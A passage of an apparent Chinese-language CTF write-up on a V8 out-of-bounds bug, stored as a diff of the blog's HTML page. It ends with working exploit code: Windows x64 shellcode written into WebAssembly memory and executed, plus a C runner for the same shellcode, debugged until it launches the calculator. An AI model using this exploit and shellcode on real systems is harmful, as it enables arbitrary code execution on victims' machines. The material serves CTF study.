+  <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span>
+  <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span>
+  <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span>
+  <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span>
+  <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
+  <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span>
+  <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span>
+  <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
+  <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">]);</span>
+
+<span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode_src</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">shellcode_zone</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">shellcode_src</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
+<span class="p">}</span>
+<span class="nx">wasmInstance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>调试一下确实发现了问题，不过并不是安全问题，是 <code class="language-plaintext highlighter-rouge">WinExec</code> 运行过程中发生了内存访问异常。</p>
+
+<p><img src="/assets/images/Pasted image 20220224221751.png" alt="" /></p>
+
+<p>但是这个目的地址是可以访问的，这是什么新型攻击手法？仔细看下发现是因为 movqs 是一条 SIMD 指令，要求操作数的地址 16 字节对齐。</p>
+
+<p>修改 shellcode 的源码，确保调用 <code class="language-plaintext highlighter-rouge">WinExec</code> 之前 rsp 是 16 字节对齐的：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// runShellcode.c</span>
+<span class="c1">// C Shellcode Run Code referenced from reenz0h (twitter: @sektor7net)</span>
+<span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">void</span><span class="o">*</span> <span class="n">exec</span><span class="p">;</span>
+  <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
+  <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
+  <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="c1">// Shellcode</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span>
+    <span class="s">"</span><span class="se">\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\x48\x83\xec\x30\x66\x81\xe4\xf0\xff\x41\xff\xd6</span><span class="s">"</span><span class="p">;</span>
+
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="mi">205</span><span class="p">;</span>
+  <span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+  <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
+  <span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
+  <span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">exec</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">shellcode_src</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mh">0xcc</span><span class="p">,</span>
+ <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span>
+  <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span>
+  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span>
+  <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span>
+  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span>
+  <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span>
+  <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span>
+  <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span>
+  <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span>
+  <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span>
+  <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
+  <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span>
+  <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span>
+  <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
+  <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>改完以后终于看到了计算器。🎉</p>
+
+  </div><div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function () {
+      this.page.url = '';
+      this.page.identifier = 'https://pwntips.github.io/2022/04/30/CTF-oob-v8.html';
+    };
+
+    (function() {
+      var d = document, s = d.createElement('script');
+
+      s.src = 'https://PwnTips.disqus.com/embed.js';
+
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript><a class="u-url" href="/2022/04/30/CTF-oob-v8.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://pwntips.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p>Tips &amp; Tricks</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
